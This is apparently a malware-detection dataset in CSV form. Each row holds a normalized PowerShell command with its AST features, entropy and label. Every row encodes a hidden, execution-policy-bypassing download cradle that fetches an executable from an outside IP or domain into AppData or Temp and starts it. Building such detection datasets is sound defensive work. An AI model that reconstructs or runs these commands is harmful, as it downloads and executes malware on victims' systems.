new_parameters,source_code,ast,node_type_statistics,ast_deep,ast_total,ast_width,entropy,label
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
ExecutionPolicy bypass noprofile windowstyle hidden Enc,powershel executionpolici bypass noprofil windowstyl hidden command new object system net webclient downloadfil http 93 174 94 135 kali ketti exe env appdata profilest exe start process env appdata profilest exe, UsingStatements null NamedBlockAst Statements CommandAst CommandElements StringConstantExpressionAst Powershell bypass hidden profilestexe CommandParameterAst null null null null InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9317494135kalikettyexe VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandElements StringConstantExpressionAst StartProcess profilestexe VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandAst 3 CommandElements 3 StringConstantExpressionAst 10 CommandParameterAst 4 InvokeMemberExpressionAst 1 Arguments 1 VariableExpressionAst 2 ParenExpressionAst 1,9,29,12,7.19245,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 89 248 166 140 zebra iesecv exe env appdata scvkem exe start process env appdata scvkem exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248166140zebraiesecvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.76435,0
window hidden enc,powershel executionpolici bypass noprofil windowstyl hidden command new object system net webclient downloadfil http 94 102 52 13 harvi scvhost exe env appdata stvgs exe start process env appdata stvgs exe, UsingStatements null NamedBlockAst Statements CommandAst CommandElements StringConstantExpressionAst Powershell bypass hidden stvgsexe CommandParameterAst null null null null InvokeMemberExpressionAst Arguments StringConstantExpressionAst http941025213harvyscvhostexe VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandElements StringConstantExpressionAst StartProcess stvgsexe VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandAst 3 CommandElements 3 StringConstantExpressionAst 10 CommandParameterAst 4 InvokeMemberExpressionAst 1 Arguments 1 VariableExpressionAst 2 ParenExpressionAst 1,9,29,12,7.29527,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
ExecutionPolicy bypass noprofile windowstyle hidden Enc,powershel executionpolici bypass noprofil windowstyl hidden command new object system net webclient downloadfil http 93 174 94 135 kali ketti exe env appdata profilest exe start process env appdata profilest exe, UsingStatements null NamedBlockAst Statements CommandAst CommandElements StringConstantExpressionAst Powershell bypass hidden profilestexe CommandParameterAst null null null null InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9317494135kalikettyexe VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandElements StringConstantExpressionAst StartProcess profilestexe VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandAst 3 CommandElements 3 StringConstantExpressionAst 10 CommandParameterAst 4 InvokeMemberExpressionAst 1 Arguments 1 VariableExpressionAst 2 ParenExpressionAst 1,9,29,12,7.19245,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 58 30 trevor winx64 exe env appdata winx64 exe start process env appdata winx64 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http941025830trevorwinx64exe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.74197,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
executionpolicy bypass enc,new object system net webclient downloadfil http nikil tk k1 ik 001 exe env temp ik 001 exe start process env temp ik 001 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpnikiltkk1ik_001exe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.56647,0
executionpolicy bypass enc,new object system net webclient downloadfil http www fluidsystem ml p1 pa 001 exe env temp pa 001 exe start process env temp pa 001 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpwwwfluidsystemsmlP1Pa_001exe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.67186,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,powershel executionpolici bypass noprofil windowstyl hidden command new object system net webclient downloadfil http 94 102 52 13 yahoo stchost exe env appdata stchost exe start process env appdata stchost exe, UsingStatements null NamedBlockAst Statements CommandAst CommandElements StringConstantExpressionAst Powershell bypass hidden stchostexe CommandParameterAst null null null null InvokeMemberExpressionAst Arguments StringConstantExpressionAst http941025213yahoostchostexe VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandElements StringConstantExpressionAst StartProcess stchostexe VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandAst 3 CommandElements 3 StringConstantExpressionAst 10 CommandParameterAst 4 InvokeMemberExpressionAst 1 Arguments 1 VariableExpressionAst 2 ParenExpressionAst 1,9,29,12,7.19643,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
ep bypass noni w hidden enc,new object system net webclient downloadfil http worldnit com aba exe mess exe start process mess exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpworldnitcomabaexe messexe ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess messexe ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 7 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,19,11,6.47737,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
